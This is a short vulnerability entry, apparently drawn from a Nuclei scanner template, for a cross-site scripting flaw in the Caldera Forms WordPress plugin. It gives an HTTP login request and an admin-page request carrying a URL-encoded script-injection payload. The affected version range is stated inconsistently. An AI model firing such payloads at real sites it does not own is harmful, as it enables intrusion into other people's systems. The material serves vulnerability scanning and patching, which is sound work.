# Vulnerability: Caldera Forms <= 1.5.4 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-caldera-forms-xss.yaml`)

## Description
The Caldera Forms WordPress plugin before 1.5.4 is affected by an cross-site scripting (XSS) vulnerability. Due to insufficient input sanitization and output escaping, attackers can inject arbitrary JavaScript via form submissions, which is then executed for users viewing entries or confirmations.

## Secure Mitigation
Update the Caldera Forms plugin to version 1.5.5 or later.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=caldera-forms&edit=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

